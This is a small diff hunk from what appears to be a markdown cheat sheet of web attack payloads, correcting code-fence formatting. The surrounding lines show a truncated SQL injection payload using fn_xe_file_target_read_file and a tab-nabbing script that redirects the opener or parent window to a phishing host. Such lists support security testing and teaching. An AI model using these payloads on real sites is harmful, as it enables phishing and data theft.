@@ -395,13 +395,12 @@ https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_f
 ```
 
  ### Tab nabbing
- '''
+ ```
  <script>
 if (window.opener) window.opener.parent.location.replace('http://phishing.com');
 if (window.parent != window) window.parent.location.replace('http://phishing.com');
 </script>
- '''
- 
+```
 
 ### XSS
 ```
